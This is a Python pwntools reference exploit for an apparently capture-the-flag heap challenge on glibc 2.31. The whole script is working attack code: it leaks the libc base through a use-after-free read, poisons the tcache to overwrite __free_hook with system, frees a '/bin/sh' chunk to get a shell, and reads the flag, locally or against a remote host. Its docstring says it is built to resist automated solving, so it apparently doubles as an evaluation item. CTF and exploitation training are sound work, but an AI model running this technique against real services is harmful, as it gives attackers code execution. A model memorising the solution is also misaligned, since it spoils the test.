#!/usr/bin/env python3
"""
Hells Bells - reference exploit.

Intended path (glibc 2.31):
  1. Plant a >0x410 chunk and a guard, free the big one so it lands in the
     unsorted bin. read-after-free (`inspect`) leaks main_arena -> libc base.
  2. Plant two same-size chunks, free both -> tcache[idx]: A -> B.
     edit-after-free on A overwrites its fd with &__free_hook (no
     safe-linking in 2.31, so the fd is a raw pointer).
  3. Allocate twice: the second allocation is returned *inside libc* at
     __free_hook. Write `system` there; free a chunk holding "/bin/sh"
     -> system("/bin/sh").

Why this resists automation: nothing here is a named one-liner. It is a
stateful heap groom -- correct allocation order, correct bin sizing, a leak
that must precede the write, and offsets pinned to the shipped libc -- that
only stabilises after several rounds of runtime feedback.

Local:   python3 solve.py
Remote:  REMOTE=host:port python3 solve.py
"""
import os
from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
FILES = os.path.abspath(os.path.join(HERE, "..", "files"))
BIN = os.path.join(FILES, "thermite-charge")
libc = ELF(os.path.join(FILES, "libc-2.31.so"), checksec=False)


def start():
    remote_env = os.environ.get("REMOTE")
    if remote_env:
        host, port = remote_env.split(":")
        return remote(host, int(port))
    return process(BIN, cwd=FILES)


io = start()


def add(idx, size, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"(0-15): ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"payload: ", data.ljust(size, b"\x00"))


def free(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"slot: ", str(idx).encode())


def edit(idx, size, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"slot: ", str(idx).encode())
    io.sendafter(b"new payload: ", data.ljust(size, b"\x00"))


def view(idx):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"slot: ", str(idx).encode())
    io.recvuntil(b"payload: ")
    return io.recv(8)


# --- 1. libc leak via the unsorted bin -------------------------------------
add(0, 0x500, b"thermite")     # > 0x410 -> not tcache
add(1, 0x28, b"guard")         # stop consolidation with the top chunk
free(0)                        # -> unsorted bin (fd/bk = main_arena+0x60)
leak = u64(view(0))
unsorted_delta = libc.sym["__malloc_hook"] + 0x70   # main_arena+0x60
libc.address = leak - unsorted_delta
log.info("libc leak    : %#x", leak)
log.success("libc base    : %#x", libc.address)
assert libc.address & 0xfff == 0, "bad libc base -- offset wrong?"

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
log.info("__free_hook  : %#x", free_hook)
log.info("system       : %#x", system)

# --- 2. tcache poisoning ----------------------------------------------------
PS = 0x18
add(2, PS, b"C")
add(3, PS, b"D")
free(3)
free(2)                        # tcache[0x20]: 2 -> 3
edit(2, PS, p64(free_hook))    # tcache[0x20]: 2 -> __free_hook

# --- 3. overwrite __free_hook and fire -------------------------------------
add(4, PS, b"/bin/sh\x00")     # reuse chunk 2, now holds the command string
add(5, PS, p64(system))        # returned at __free_hook -> __free_hook=system
free(4)                        # free("/bin/sh" chunk) -> system("/bin/sh")

# --- shell ------------------------------------------------------------------
io.sendline(b"cat flag.txt")
io.recvuntil(b"csaw{")
flag = b"csaw{" + io.recvuntil(b"}")
log.success("FLAG: %s", flag.decode())
assert flag.startswith(b"csaw{") and flag.endswith(b"}")
print(flag.decode())
